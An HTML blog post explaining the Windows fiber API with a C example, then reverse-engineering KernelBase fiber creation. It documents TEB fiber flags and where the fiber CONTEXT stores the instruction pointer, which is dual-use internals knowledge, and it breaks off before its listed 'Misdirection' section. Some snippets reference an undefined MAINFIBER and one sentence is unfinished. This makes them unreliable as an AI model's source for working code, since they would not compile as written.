@@ -1,0 +1,983 @@
+<html>
+    <head>
+        <title>Here Be Dragons</title>
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🐉</text></svg>">
+        <link rel="stylesheet" href="dank.css">
+    </head>
+    <body>
+        <center>
+        <div style="display: inline-block; text-align: left;">
+        <pre>
+<!--
+    Ascii art thanks to
+    https://fsymbols.com/generators/carty/
+-->
+
+██████████████████████
+█─▄▄─█▄─▀─▄█─▄▄─█─▄▄─█
+█─██─██▀─▀██─██─█─██─█
+▀▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▀▄▄▄▄▀
+
+        </pre>
+    </div>
+    </center>
+        <div style="width: 60%;">
+            <pre class="text">
+                <h2>A Foray For Fun into Windows Fibers</h2>
+The Windows fiber API has been described as one of the "most elegant" APIs available to the Windows programmer for manual execution scheduling.
+I'm by no means an expert in how fibers work, nor how to deploy them into a large-scale application.
+There is not a lot of documentation about how fibers work internally, so I thought it might be at least interesting or helpful to write about some of what I found.
+            </pre>
+            <h3>ToC</h3>
+<ul>
+    <li>🚀<a href="#0">0x00:</a> About</li>
+    <li>🚀<a href="#1">0x01:</a> Intro</li>
+    <li>🚀<a href="#2">0x02:</a> Instantiation</li>
+    <li>🚀<a href="#3">0x03:</a> Execution</li>
+    <li>🚀<a href="#4">0x04:</a> Misdirection</li>
+</ul>
+<h3 id="0">0x00: About</h3>
+<pre class="text">
+"What is the Windows Fiber API?"
+WELL, I'm very glad you asked. I mean, why else would you be here?
+The Windows Fiber API exposes a means of manually "scheduling" execution within a process thread.
+
+<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">To quote MSDN</a>:
+"A fiber is a unit of execution that must be manually scheduled by the application. Fibers run in the context of the threads that schedule them. Each thread can schedule multiple fibers. In general, fibers do not provide advantages over a well-designed multithreaded application."
+
+In regular terms, the Windows Fiber API provides developers with a means to manually schedule execution of many routines (converted to fibers) with a simple, lightweight API in <b>one thread</b>. 
+<b>(Many Fibers, One Thread, Manually Switched)</b>
+
+It is important to note that a fiber is not 
+
+A similar, thread-based API exists as the User Mode Scheduler API (UMS) which provides similar, more robust (read: complex), <b>thread-based</b> scheduling capabilities for developers. 
+<b>(Many Threads, One Scheduler Routine)</b>
+
+While not the topic of this post, I found it relevant to call out because I think both are really neat.
+</pre>
+<h3 id="1">0x01: Intro</h3>
+<pre class="text">
+The example MSDN code is very nice, and can be located <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/using-fibers">here</a>.
+
+For this much, MUCH simpler example, let's consider the following scenario:
+We would like to create three routines <b>HotPotatoOne</b>, <b>HotPotatoTwo</b>, and <b>HotPotatoThree</b>.
+Within one thread we want to schedule <b>HotPotatoOne</b>, <b>HotPotatoTwo</b>, and <b>HotPotatoThree</b> to "pass" eachother a "potato" (unsigned int).
+Each fiber will receive one unsigned int parameter and add it's respective number to it, and return:
+
+    <b>HotPotatoOne</b> adds 1
+    <b>HotPotatoOne</b> switches to <b>HotPotatoTwo</b>
+    <b>HotPotatoTwo</b> adds 2
+    <b>HotPotatoTwo</b> switches to <b>HotPotatoThree</b>
+    <b>HotPotatoThree</b> adds 3
+    <b>HotPotatoThree</b> switches to <b>HotPotatoOne</b>
+
+We will call each routine in a loop until the number is greater than 1337.
+
+A sane programmer would not use fibers for this.
+Luckily, as an IT consultant, I lost my sanity a while ago.
+
+Let's consider what we need to do in order to accomplish this task:
+
+    1. Convert the instatniating (main, in our case) thread to a fiber <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertthreadtofiber">(ConvertThreadToFiber)</a>
+    2. Create a fiber for each of the HotPotato routines <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiber">(CreateFiber)</a>
+    3. Set the fiber data to a pointer to our starting number <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-getfiberdata">(GetFiberData, within the fiber)</a>
+    4. Switch to each of the HotPotato fibers <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-switchtofiber">(SwitchToFiber)</a>
+    5. Exit if the number is greater than 1337 
+
+Now, let's see how the code looks!
+</pre>
+<pre class="code">
+#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+void __stdcall HotPotatoOne(LPVOID lpParam);
+void __stdcall HotPotatoTwo(LPVOID lpParam);
+void __stdcall HotPotatoThree(LPVOID lpParam);
+
+#define FIBER_MAIN 0
+#define FIBER_HP_ONE 1
+#define FIBER_HP_TWO 2
+#define FIBER_HP_THREE 3
+
+
+unsigned int potato = 0;
+LPVOID HOT_POTATOES[4] = { NULL, NULL, NULL, NULL };
+
+int main() {
+
+	// Step 1
+	LPVOID AddrMainFiber = ConvertThreadToFiber(NULL);
+
+	// Step 2
+	LPVOID AddrHotPotatoOne = CreateFiber(0, (LPFIBER_START_ROUTINE)HotPotatoOne, &potato);
+	LPVOID AddrHotPotatoTwo = CreateFiber(0, (LPFIBER_START_ROUTINE)HotPotatoTwo, &potato);
+	LPVOID AddrHotPotatoThree = CreateFiber(0, (LPFIBER_START_ROUTINE)HotPotatoThree, &potato);
+	if (!(AddrMainFiber && AddrHotPotatoOne && AddrHotPotatoTwo && AddrHotPotatoThree)) {
+		puts("Couldn't create one of the fibers :(\nQuitting");
+		return 0;
+	}
+	
+	HOT_POTATOES[FIBER_HP_ONE] = AddrHotPotatoOne;
+	HOT_POTATOES[FIBER_HP_TWO] = AddrHotPotatoTwo;
+	HOT_POTATOES[FIBER_HP_THREE] = AddrHotPotatoThree;
+	HOT_POTATOES[FIBER_MAIN] = AddrMainFiber;
+
+	// Step 4
+	SwitchToFiber(AddrHotPotatoOne);
+	DeleteFiber(HOT_POTATOES[FIBER_HP_ONE]);
+	DeleteFiber(HOT_POTATOES[FIBER_HP_TWO]);
+	DeleteFiber(HOT_POTATOES[FIBER_HP_THREE]);
+	DeleteFiber(HOT_POTATOES[FIBER_MAIN]);
+
+	return 1;
+}
+
+void __stdcall HotPotatoOne(LPVOID lpParam) {
+    // Step 3
+    unsigned int* potato_local = (unsigned int*)GetFiberData();
+    do {
+        *potato_local += 1;
+        printf("Hot Potato One adds 1, potato is now %d!\n", *potato_local);
+        // Step 4
+        SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]);
+    } while (*potato_local < 1337); // Step 5
+    SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+}
+
+void __stdcall HotPotatoTwo(LPVOID lpParam) {
+    // Step 3
+    unsigned int* potato_local = (unsigned int*)GetFiberData();
+    do {
+        *potato_local += 2;
+        printf("Hot Potato Two adds 2, potato is now %d!\n", *potato_local);
+        // Step 4
+        SwitchToFiber(HOT_POTATOES[FIBER_HP_THREE]);
+    } while (*potato_local < 1337); // Step 5
+    SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+}
+
+void __stdcall HotPotatoThree(LPVOID lpParam) {
+    // Step 3
+    unsigned int* potato_local = (unsigned int*)GetFiberData();
+    do {
+        *potato_local += 3;
+        printf("Hot Potato Three adds 3, potato is now %d!\n", *potato_local);
+        // Step 4
+        SwitchToFiber(HOT_POTATOES[FIBER_HP_ONE]);
+    } while (*potato_local < 1337); // Step 5
+    SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+}
+</pre>
+
+<pre class="text">
+The output from this is as expected!
+</pre>
+
+<pre class="code">
+    Hot Potato One adds 1, potato is now 1!
+    Hot Potato Two adds 2, potato is now 3!
+    Hot Potato Three adds 3, potato is now 6!
+    Hot Potato One adds 1, potato is now 7!
+    Hot Potato Two adds 2, potato is now 9!
+    <b>. . .</b>
+    <b>TRUNCATED</b>
+    <b>. . .</b>
+    Hot Potato Three adds 3, potato is now 1332!
+    Hot Potato One adds 1, potato is now 1333!
+    Hot Potato Two adds 2, potato is now 1335!
+    Hot Potato Three adds 3, potato is now 1338!    
+</pre>
+<pre class="text">
+Looking at each fiber method, the avid reader might notice something really odd about how we're handling control flow.
+Let's take a look at how we're *switching* to our HotPotato routines.
+For example, the first function, <b>HotPotatoOne</b>:
+</pre>
+<pre class="code">
+void __stdcall HotPotatoOne(LPVOID lpParam) {
+    // Step 3
+    unsigned int* potato_local = (unsigned int*)GetFiberData();
+    do {
+        *potato_local += 1;
+        printf("Hot Potato One adds 1, potato is now %d!\n", *potato_local);
+        // Step 4
+        SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]);
+    } while (*potato_local < 1337); // Step 5
+    SwitchToFiber(HOT_POTATOES[MAINFIBER]);
+}
+</pre>
+<pre class="text">
+After incrementing our potato, we switch to the next HotPotato function.
+Seems intuitive.
+So why the do/while and the SwitchToFiber back to the main thread?
+
+Consider an alternative function, <b>BadHotPotatoOne</b>: 
+</pre>
+
+<pre class="code">
+void __stdcall BadHotPotatoOne(LPVOID lpParam) {
+    unsigned int* potato_local = (unsigned int*)GetFiberData();
+    *potato_local += 1;
+    printf("Hot Potato One adds 1, potato is now %d!\n", *potato_local);
+    SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]);
+    if(*potato_local > 1337){
+        SwitchToFiber(HOT_POTATOES[MAINFIBER]);
+    }        
+}
+</pre>
+<pre class="text">
+<b>BadHotPotatoOne</b> switches to <b>HotPotatoTwo</b>
+<b>HotPotatoTwo</b> switches to <b>HotPotatoThree</b>
+<b>HotPotatoThree</b> switches to <b>BadHotPotatoOne</b>
+
+<b>What happens next?</b>
+
+When <b>HotPotatoThree</b> calls SwitchToFiber back to <b>BadHotPotatoOne</b>, SwitchToFiber begins execution based on the next instruction of <b>BadHotPotatoOne</b> after the call to SwitchToFiber.
+In this case, the next instruction following our return to <b>BadHotPotatoOne</b> is our if statement, not the beginning of our fiber.
+</pre>
+<pre class="code">
+void __stdcall BadHotPotatoOne(LPVOID lpParam) {
+    unsigned int* potato_local = (unsigned int*)GetFiberData();
+    *potato_local += 1;
+    printf("Hot Potato One adds 1, potato is now %d!\n", *potato_local);
+    <b class="green">SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]); <- Switches to HotPotatoTwo, then HotPotatoThree, then -</b>
+    <b>if(*potato_local > 1337){ <- Execution returns to the next statement when HotPotatoThree switches back</b>
+        SwitchToFiber(HOT_POTATOES[MAINFIBER]);
+    }        
+}
+</pre>
+
+<pre class="text">
+As such we want to make sure our desired behavior of looping is the next instruction after our call to SwitchToFiber.
+In our good function, <b>HotPotatoOne</b>, the next instruction is a "while" comparison, then a "do" loop which brings us back to <b>HotPotatoTwo</b>.
+This way, when execution is switched back to <b>HotPotatoOne</b> from <b>HotPotatoThree</b>, we loop rather than return.
+</pre>
+    <pre class="code">
+    void __stdcall HotPotatoOne(LPVOID lpParam) {
+        // Step 3
+        unsigned int* potato_local = (unsigned int*)GetFiberData();
+        do {
+            *potato_local += 1;
+            printf("Hot Potato One adds 1, potato is now %d!\n", *potato_local);
+            // Step 4
+            <b class="green">SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]); <- Switches to HotPotatoTwo, then HotPotatoThree, then -</b>
+            <b>} while (*potato_local < 1337); <- Execution returns to comparison, keeps looping until *potato_local > 1337</b>
+        SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+    }
+</pre>
+
+<pre class="text">
+Neat.
+
+</pre>
+<h3 id="2">0x02: Instantiation</h3>
+<pre class="text">
+The documentation is a lie.
+No, seriously. Well. Kind of.
+
+The MSDN documentation for CreateFiber and ConvertThreadToFiber tells us that the return value is the <b>address of the fiber</b>.
+This is "true," but misleading as the "FIBER" structure is not documented.
+<i>I originally interpreted it</i> as the base address of the routine I'm Converting into/Creating as a fiber.
+
+The ACTUAL return value of these functions is a fiber object. (Object in a representative sense, not the type sense).
+This data structure seems to be very similar to a thread's<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-arm64_nt_context">CONTEXT</a> struct used in the Get/SetThreadContext functions.
+
+Let's take a closer look into each function we called that returns an LPVOID fiber object (ConvertThreadToFiber, CreateFiber).
+The fine folks at ReactOS have written an implementation of ConvertThreadToFiber/Ex.
+Let's look at that source and compare with the disassembly of KernelBase!ConvertThreadToFiberEx.
+
+ReactOS <a href="https://doxygen.reactos.org/d9/d44/dll_2win32_2kernel32_2client_2fiber_8c_source.html">ConvertThreadToFiberEx</a>:
+</pre>
+<pre class="code">
+LPVOID
+WINAPI
+ConvertThreadToFiberEx(_In_opt_ LPVOID lpParameter,
+                    _In_ DWORD dwFlags)
+{
+    PTEB Teb;
+    PFIBER Fiber;
+    DPRINT1("Converting Thread to Fiber\n");
+
+    /* Check for invalid flags */
+    if (dwFlags & ~FIBER_FLAG_FLOAT_SWITCH)
+    {
+        /* Fail */
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return NULL;
+    }
+
+    /* Are we already a fiber? */
+    Teb = NtCurrentTeb();
+    if (Teb->HasFiberData)
+    {
+        /* Fail */
+        SetLastError(ERROR_ALREADY_FIBER);
+        return NULL;
+    }
+
+    /* Allocate the fiber */
+    Fiber = RtlAllocateHeap(RtlGetProcessHeap(),
+                            0,
+                            sizeof(FIBER));
+    if (!Fiber)
+    {
+        /* Fail */
+        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+        return NULL;
+    }
+
+    <b>. . .</b>
+    <b> TRUNCATED, boring shit I don't care about </b>
+    <b>. . .</b>
+
+    /* Associate the fiber to the current thread */
+    <b class="green">Teb->NtTib.FiberData = Fiber;
+    Teb->HasFiberData = TRUE; // what we really care about</b>
+
+    /* Return opaque fiber data */
+    <b class="green">return (LPVOID)Fiber; // MSDN says this is a pointer to the fiber, rather than the fiber object
+    // HMMMMMMM    
+    </b> 
+}
+</pre>
+<pre class="text">
+Compare this with the disassembly of KernelBase!ConvertThreadToFiberEx
+</pre>
+<pre class="code">
+KERNELBASE!ConvertThreadToFiber:
+00007ffc`cdd58160 48895c2408         mov     qword ptr [rsp+8], rbx ss:000000c4`533bf970={FiberBlog!_NULL_IMPORT_DESCRIPTOR <PERF> (FiberBlog+0x22015) (00007ff6`49e62015)}
+00007ffc`cdd58165 4889742410         mov     qword ptr [rsp+10h], rsi
+00007ffc`cdd5816a 57                 push    rdi
+00007ffc`cdd5816b 4883ec20           sub     rsp, 20h
+<b class="green">00007ffc`cdd5816f 65488b3c2530000000 mov     rdi, qword ptr gs:[30h] 
+; rdi gets a pointer to the current _NT_TIB</b>
+
+<b>. . .</b>
+<b> T R U N C A T E D </b>
+<b>. . .</b>
+
+<b class="green">
+00007ffc`cdd58252 66838fee17000004   or      word ptr [rdi+17EEh], 4
+; Setting the Teb->HasFiberData flag to True
+</b>
+
+<b class="green">
+00007ffc`cdd5825a 48895720           mov     qword ptr [rdi+20h], rdx
+; Setting Teb->FiberData
+</b>
+00007ffc`cdd5825e 488b742438         mov     rsi, qword ptr [rsp+38h]
+00007ffc`cdd58263 488bc3             mov     rax, rbx
+00007ffc`cdd58266 488b5c2430         mov     rbx, qword ptr [rsp+30h]
+00007ffc`cdd5826b 4883c420           add     rsp, 20h
+00007ffc`cdd5826f 5f                 pop     rdi
+00007ffc`cdd58270 c3                 ret 
+</pre>
+<pre class="text">
+
+The behavior is, for all semantic purposes, identical. Thank you ReactOS team :)
+So what's the deal with the TEB and TIB?
+WELL, I'm glad you asked.
+
+Let's take the two instructions from the disassembly and check to see what offsets they're referencing.
+<b>(rdi == TEB)</b>
+</pre>
+<pre class="code">
+<b class="green">
+00007ffc`cdd58252 66838fee17000004   or      word ptr [rdi+17EEh], 4
+; Setting the Teb->HasFiberData flag to True
+</b><b class="green">
+00007ffc`cdd5825a 48895720           mov     qword ptr [rdi+20h], rdx
+; Setting Teb->FiberData
+</b>    
+</pre>
+<pre class="text">
+Examining the TEB structure, we find that the WORD referenced by <b>*(rdi+0x17ee)</b> actually represents bit flags for different features in the process.
+</pre>
+<pre class="code">
+0:000> dt nt!_TEB
+ntdll!_TEB
+    +0x17ee SameTebFlags     : Uint2B
+    +0x17ee SafeThunkCall    : Pos 0, 1 Bit
+    +0x17ee InDebugPrint     : Pos 1, 1 Bit
+    <b class="green">+0x17ee HasFiberData     : Pos 2, 1 Bit ; "or word ptr [rdi+17EEh], 4" sets this to TRUE</b> 
+    +0x17ee SkipThreadAttach : Pos 3, 1 Bit
+    +0x17ee WerInShipAssertCode : Pos 4, 1 Bit
+    +0x17ee RanProcessInit   : Pos 5, 1 Bit
+    +0x17ee ClonedThread     : Pos 6, 1 Bit
+    +0x17ee SuppressDebugMsg : Pos 7, 1 Bit
+    +0x17ee DisableUserStackWalk : Pos 8, 1 Bit
+    +0x17ee RtlExceptionAttached : Pos 9, 1 Bit
+    +0x17ee InitialThread    : Pos 10, 1 Bit
+    +0x17ee SessionAware     : Pos 11, 1 Bit
+    +0x17ee LoadOwner        : Pos 12, 1 Bit
+    +0x17ee LoaderWorker     : Pos 13, 1 Bit
+    +0x17ee SkipLoaderInit   : Pos 14, 1 Bit
+    +0x17ee SpareSameTebBits : Pos 15, 1 Bit
+</pre>
+<pre class="text">
+We can also see that the <b>QWORD PTR</b> referenced by <b>*(rdi+0x20)</b> is a FiberData pointer in the process' TIB.
+</pre>
+<pre class="code">
+0:000> dt nt!_NT_TIB
+ntdll!_NT_TIB
+    +0x000 ExceptionList    : Ptr64 _EXCEPTION_REGISTRATION_RECORD
+    +0x008 StackBase        : Ptr64 Void
+    +0x010 StackLimit       : Ptr64 Void
+    +0x018 SubSystemTib     : Ptr64 Void
+    <b class="green">+0x020 FiberData        : Ptr64 Void ; This is what GetFiberData fetches</b>
+    +0x020 Version          : Uint4B
+    +0x028 ArbitraryUserPointer : Ptr64 Void
+    +0x030 Self             : Ptr64 _NT_TIB
+</pre>
+<pre class="text">
+Neat. So our FiberData pointer and HasFiberData flag both live in the TEB.
+One could define a GetFiberData macro essentially as a few intrinsic functions equivalent to:
+</pre>
+<pre class="code">
+void* GetFiberData(){
+    #ifdef _WIN64
+    return __readgsqword(0x20) // mov rax, gs:[20]
+    #else
+    return __readfsdword(0x20) // mov eax, fs:[20]
+    #endif
+}
+</pre>
+<pre class="text">
+So how does CreateFiber store the instruction pointer of the function we desire?
+Let's again go back to ReactOS for definition of <a href="https://doxygen.reactos.org/d9/d44/dll_2win32_2kernel32_2client_2fiber_8c_source.html">CreateFiberEx</a> (this time without truncation):
+</pre>
+<pre class="code">
+/*
+* @implemented
+*/
+LPVOID
+WINAPI
+CreateFiberEx(_In_ SIZE_T dwStackCommitSize,
+            _In_ SIZE_T dwStackReserveSize,
+            _In_ DWORD dwFlags,
+            _In_ LPFIBER_START_ROUTINE lpStartAddress,
+            _In_opt_ LPVOID lpParameter)
+{
+    <b class="green">PFIBER Fiber; !! Note this</b>
+    NTSTATUS Status;
+    INITIAL_TEB InitialTeb;
+    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
+    DPRINT("Creating Fiber\n");
+
+    /* Check for invalid flags */
+    if (dwFlags & ~FIBER_FLAG_FLOAT_SWITCH)
+    {
+        /* Fail */
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return NULL;
+    }
+
+    /* Allocate the Activation Context Stack */
+    ActivationContextStackPointer = NULL;
+    Status = RtlAllocateActivationContextStack(&ActivationContextStackPointer);
+    if (!NT_SUCCESS(Status))
+    {
+        /* Fail */
+        BaseSetLastNTError(Status);
+        return NULL;
+    }
+
+    /* Allocate the fiber */
+    Fiber = RtlAllocateHeap(RtlGetProcessHeap(),
+                            0,
+                            sizeof(FIBER));
+    if (!Fiber)
+    {
+        /* Free the activation context stack */
+        RtlFreeActivationContextStack(ActivationContextStackPointer);
+
+        /* Fail */
+        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+        return NULL;
+    }
+
+    /* Create the stack for the fiber */
+    Status = BaseCreateStack(NtCurrentProcess(),
+                            dwStackCommitSize,
+                            dwStackReserveSize,
+                            &InitialTeb);
+    if (!NT_SUCCESS(Status))
+    {
+        /* Free the fiber */
+        RtlFreeHeap(GetProcessHeap(),
+                    0,
+                    Fiber);
+
+        /* Free the activation context stack */
+        RtlFreeActivationContextStack(ActivationContextStackPointer);
+
+        /* Failure */
+        BaseSetLastNTError(Status);
+        return NULL;
+    }
+
+    /* Clear the context */
+    RtlZeroMemory(&Fiber->FiberContext,
+                sizeof(CONTEXT));
+
+    /* Copy the data into the fiber */
+    Fiber->StackBase = InitialTeb.StackBase;
+    Fiber->StackLimit = InitialTeb.StackLimit;
+    Fiber->DeallocationStack = InitialTeb.AllocatedStackBase;
+    Fiber->FiberData = lpParameter;
+    Fiber->ExceptionList = EXCEPTION_CHAIN_END;
+    Fiber->GuaranteedStackBytes = 0;
+    Fiber->FlsData = NULL;
+    Fiber->ActivationContextStackPointer = ActivationContextStackPointer;
+
+    /* Save FPU State if requested, otherwise just the basic registers */
+    Fiber->FiberContext.ContextFlags = (dwFlags & FIBER_FLAG_FLOAT_SWITCH) ?
+                                    (CONTEXT_FULL | CONTEXT_FLOATING_POINT) :
+                                    CONTEXT_FULL;
+
+    /* Initialize the context for the fiber */
+    BaseInitializeContext(<b class="green">&Fiber->FiberContext, // AHA! We found the CONTEXT we were looking for!</b>
+                        lpParameter,
+                        <b class="green">lpStartAddress</b>
+                        InitialTeb.StackBase,
+                        2);
+
+    /* Return the Fiber */
+    return Fiber;
+}
+</pre>
+<pre class="text">
+Neat!
+So now let's check KernelBase!CreateFiberEx to see how it works the same:    
+</pre>
+<pre class="code">
+<b>TRIMMED FOR BREVITY</b>
+<b class="green">00007ffc`cdcf5511 48ff1598a31b00     call    qword ptr [KERNELBASE!_imp_RtlAllocateHeap (00007ffc`cdeaf8b0)] ; Allocating the fiber object on the heap</b>
+00007ffc`cdcf5518 0f1f440000         nop     dword ptr [rax+rax]
+<b class="green">00007ffc`cdcf551d 488bf8             mov     rdi, rax ; store it's pointer in rdi</b>
+00007ffc`cdcf5520 4885c0             test    rax, rax
+00007ffc`cdcf5523 0f8418f80800       je      KERNELBASE!CreateFiberEx+0x8f8b1 (00007ffc`cdd84d41)
+00007ffc`cdcf5529 8b05c9682800       mov     eax, dword ptr [KERNELBASE!SysInfo+0x18 (00007ffc`cdf7bdf8)]
+00007ffc`cdcf552f 488d4dd0           lea     rcx, [rbp-30h]
+00007ffc`cdcf5533 448b0dae682800     mov     r9d, dword ptr [KERNELBASE!SysInfo+0x8 (00007ffc`cdf7bde8)]
+00007ffc`cdcf553a 4533c0             xor     r8d, r8d
+00007ffc`cdcf553d 48894c2428         mov     qword ptr [rsp+28h], rcx
+00007ffc`cdcf5542 488bd3             mov     rdx, rbx
+00007ffc`cdcf5545 498bcf             mov     rcx, r15
+00007ffc`cdcf5548 4889442420         mov     qword ptr [rsp+20h], rax
+00007ffc`cdcf554d 48ff1524a01b00     call    qword ptr [KERNELBASE!_imp_RtlCreateUserStack (00007ffc`cdeaf578)]
+00007ffc`cdcf5554 0f1f440000         nop     dword ptr [rax+rax]
+00007ffc`cdcf5559 85c0               test    eax, eax
+00007ffc`cdcf555b 0f885ff80800       js      KERNELBASE!CreateFiberEx+0x8f930 (00007ffc`cdd84dc0)
+00007ffc`cdcf5561 33c0               xor     eax, eax
+00007ffc`cdcf5563 4c896dc8           mov     qword ptr [rbp-38h], r13
+00007ffc`cdcf5567 f3480f1ec8         rdsspq  rax
+00007ffc`cdcf556c 4885c0             test    rax, rax
+00007ffc`cdcf556f 0f8582f80800       jne     KERNELBASE!CreateFiberEx+0x8f967 (00007ffc`cdd84df7)
+00007ffc`cdcf5575 33d2               xor     edx, edx
+<b class="green">00007ffc`cdcf5577 488d4f30           lea     rcx, [rdi+30h] ; Remember how the fiber object' CONTEXT is offset 0x30 from it's base? Load that into rcx</b>
+00007ffc`cdcf557b 41b8d0040000       mov     r8d, 4D0h
+<b class="green">00007ffc`cdcf5581 e839c90800         call    KERNELBASE!memset (00007ffc`cdd81ebf) ; Zero it </b>
+00007ffc`cdcf5586 488b5550           mov     rdx, qword ptr [rbp+50h]
+00007ffc`cdcf558a 488d4f30           lea     rcx, [rdi+30h]
+00007ffc`cdcf558e 488917             mov     qword ptr [rdi], rdx ds:000002aa`f96b23a0=000002aaf96a0150
+00007ffc`cdcf5591 4080e601           and     sil, 1
+00007ffc`cdcf5595 488b45e0           mov     rax, qword ptr [rbp-20h]
+00007ffc`cdcf5599 4d8bc4             mov     r8, r12
+00007ffc`cdcf559c 48894710           mov     qword ptr [rdi+10h], rax
+00007ffc`cdcf55a0 488b45e8           mov     rax, qword ptr [rbp-18h]
+00007ffc`cdcf55a4 48894718           mov     qword ptr [rdi+18h], rax
+00007ffc`cdcf55a8 488b45f0           mov     rax, qword ptr [rbp-10h]
+00007ffc`cdcf55ac 48834f08ff         or      qword ptr [rdi+8], 0FFFFFFFFFFFFFFFFh
+00007ffc`cdcf55b1 48894720           mov     qword ptr [rdi+20h], rax
+00007ffc`cdcf55b5 4c89af00050000     mov     qword ptr [rdi+500h], r13
+00007ffc`cdcf55bc 4c89af10050000     mov     qword ptr [rdi+510h], r13
+00007ffc`cdcf55c3 4489af18050000     mov     dword ptr [rdi+518h], r13d
+00007ffc`cdcf55ca 664489af1c050000   mov     word ptr [rdi+51Ch], r13w
+00007ffc`cdcf55d2 488b45c0           mov     rax, qword ptr [rbp-40h]
+00007ffc`cdcf55d6 48898708050000     mov     qword ptr [rdi+508h], rax
+00007ffc`cdcf55dd 488b4710           mov     rax, qword ptr [rdi+10h]
+00007ffc`cdcf55e1 483305e0672800     xor     rax, qword ptr [KERNELBASE!BasepFiberCookie (00007ffc`cdf7bdc8)]
+00007ffc`cdcf55e8 4833c7             xor     rax, rdi
+00007ffc`cdcf55eb 4c89742420         mov     qword ptr [rsp+20h], r14
+00007ffc`cdcf55f0 48898720050000     mov     qword ptr [rdi+520h], rax
+00007ffc`cdcf55f7 40f6de             neg     sil
+00007ffc`cdcf55fa 488b45c8           mov     rax, qword ptr [rbp-38h]
+00007ffc`cdcf55fe 48898728050000     mov     qword ptr [rdi+528h], rax
+00007ffc`cdcf5605 1bc0               sbb     eax, eax
+00007ffc`cdcf5607 2508001000         and     eax, 100008h
+00007ffc`cdcf560c 894760             mov     dword ptr [rdi+60h], eax
+00007ffc`cdcf560f 4c8b4de0           mov     r9, qword ptr [rbp-20h]
+<b class="green">00007ffc`cdcf5613 e828000000         call    KERNELBASE!BaseInitializeFiberContext (00007ffc`cdcf5640) ; Initialize the CONTEXT with the created fiber's routine address</b>
+00007ffc`cdcf5618 488bc7             mov     rax, rdi
+00007ffc`cdcf561b 4c8d5c2470         lea     r11, [rsp+70h]
+00007ffc`cdcf5620 498b5b30           mov     rbx, qword ptr [r11+30h]
+00007ffc`cdcf5624 498b7338           mov     rsi, qword ptr [r11+38h]
+00007ffc`cdcf5628 498b7b40           mov     rdi, qword ptr [r11+40h]
+00007ffc`cdcf562c 498be3             mov     rsp, r11
+00007ffc`cdcf562f 415f               pop     r15
+00007ffc`cdcf5631 415e               pop     r14
+00007ffc`cdcf5633 415d               pop     r13
+00007ffc`cdcf5635 415c               pop     r12
+00007ffc`cdcf5637 5d                 pop     rbp
+00007ffc`cdcf5638 c3                 ret     
+</pre>
+
+<pre class="text">
+The BaseInitializeFiberContext function has two arguments that we care about in rcx and r8: 
+CONTEXT for the fiber, and LPFIBER_START_ROUTINE respectively.
+
+By taking a look at the disassembly for BaseInitializeFiberContext, we can find out where exactly the real instruction pointer goes in the fiber object.
+</pre>
+
+<pre class="code">
+KERNELBASE!BaseInitializeFiberContext:
+00007ffc`cdcf5640 48895c2408         mov     qword ptr [rsp+8], rbx ss:000000c4`533bf890=0000000000001000
+00007ffc`cdcf5645 48896c2410         mov     qword ptr [rsp+10h], rbp
+00007ffc`cdcf564a 4889742418         mov     qword ptr [rsp+18h], rsi
+00007ffc`cdcf564f 57                 push    rdi
+00007ffc`cdcf5650 4883ec20           sub     rsp, 20h
+<b class="green">00007ffc`cdcf5654 498bf0             mov     rsi, r8 ; rsi now holds LPFIBER_START_ROUTINE</b>
+00007ffc`cdcf5657 488bea             mov     rbp, rdx
+00007ffc`cdcf565a 33d2               xor     edx, edx
+00007ffc`cdcf565c 41b8d0040000       mov     r8d, 4D0h
+00007ffc`cdcf5662 498bf9             mov     rdi, r9
+<b class="green">00007ffc`cdcf5665 488bd9             mov     rbx, rcx ; rbx now holds CONTEXT for the fiber</b>
+00007ffc`cdcf5668 e852c80800         call    KERNELBASE!memset (00007ffc`cdd81ebf)
+00007ffc`cdcf566d c743300b001000     mov     dword ptr [rbx+30h], 10000Bh
+00007ffc`cdcf5674 65488b042560000000 mov     rax, qword ptr gs:[60h]
+00007ffc`cdcf567d f6400304           test    byte ptr [rax+3], 4
+00007ffc`cdcf5681 0f8499000000       je      KERNELBASE!BaseInitializeFiberContext+0xe0 (00007ffc`cdcf5720)
+00007ffc`cdcf5687 0f31               rdtsc   
+00007ffc`cdcf5689 8b0d59672800       mov     ecx, dword ptr [KERNELBASE!SysInfo+0x8 (00007ffc`cdf7bde8)]
+00007ffc`cdcf568f 48c1e220           shl     rdx, 20h
+00007ffc`cdcf5693 480bc2             or      rax, rdx
+00007ffc`cdcf5696 48c1e905           shr     rcx, 5
+00007ffc`cdcf569a 33d2               xor     edx, edx
+00007ffc`cdcf569c 48f7f1             div     rax, rcx
+00007ffc`cdcf569f 48c1e204           shl     rdx, 4
+00007ffc`cdcf56a3 b9801f0000         mov     ecx, 1F80h
+<b class="green">00007ffc`cdcf56a8 4889b380000000     mov     qword ptr [rbx+80h], rsi ; AHA! We have found that the instruction pointer is at offset 0x80 from the CONTEXT </b>
+00007ffc`cdcf56af 488b742440         mov     rsi, qword ptr [rsp+40h]
